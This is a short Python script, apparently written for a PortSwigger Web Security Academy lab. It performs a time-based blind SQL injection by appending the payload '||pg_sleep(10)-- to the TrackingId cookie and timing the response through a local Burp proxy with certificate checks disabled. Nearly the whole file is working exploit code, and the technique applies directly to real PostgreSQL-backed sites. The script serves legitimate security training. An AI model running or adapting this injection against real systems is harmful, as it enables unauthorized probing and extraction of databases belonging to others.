import requests
import urllib3
import urllib.parse
import time 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a6500c10430d2e480f9eec500390028.web-security-academy.net"
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

initial_response = requests.get(url, proxies=proxies, verify=False)

# Extract cookies from the response
cookie_jar = initial_response.cookies
tracking_id = cookie_jar.get('TrackingId')
session_id = cookie_jar.get('session')

#exploit the website and return the response 
def req_visit (raw_injection):
	
	encoded_injection = urllib.parse.quote(raw_injection)

	# Send SQLi request with injected cookie
	cookies = {
	    'TrackingId': tracking_id + encoded_injection,
	    'session': session_id
	}
	start = time.time()
	injection_response = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
	end = time.time()
	if (end - start >= 10):
		print ("got it")
	else:
		print ("False")

raw_injection = f"'||pg_sleep(10)--"
req_visit(raw_injection)
